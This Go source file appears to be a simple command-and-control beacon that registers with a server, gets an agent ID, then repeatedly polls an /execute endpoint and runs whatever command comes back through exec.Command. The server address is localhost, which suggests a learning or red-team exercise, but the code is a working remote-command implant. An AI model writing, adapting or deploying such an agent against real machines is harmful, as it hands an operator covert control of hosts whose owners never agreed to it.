package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"
)

func main() {
	agentId := ""
	// sleep := time.Duration(10)
	sleep := 10
	resp, err := http.Get("http://localhost:80/register")

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	agentId = string(body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Agent ID:", agentId)
loop:
	for {
		fmt.Printf("[*] Sleeping for %v seconds", sleep)
		time.Sleep(time.Duration(sleep) * time.Second)
		data := url.Values{
			"agentId": {agentId},
		}
		resp2, err := http.PostForm("http://localhost:80/execute", data)

		if err != nil {
			log.SetFlags(0)
			log.Printf("[-] Error fetching command: %s", err)
		}

		defer resp2.Body.Close()

		command, err := ioutil.ReadAll(resp2.Body)

		if string(command) == "no commands found" {
			log.SetFlags(0)
			log.Println("\n[-] No command to run")
			goto loop
		}

		fmt.Println("[+] Running command: " + string(command))
		command_clean := strings.Replace(string(command), "\n", "", -1)
		command_array := strings.Fields(command_clean)
		out, err := exec.Command(command_array[0], command_array[1:]...).Output()
		if err != nil {
			log.SetFlags(0)
			log.Printf("[-] Error running command: %s", err)
		}
		fmt.Println(string(out))
	}
}
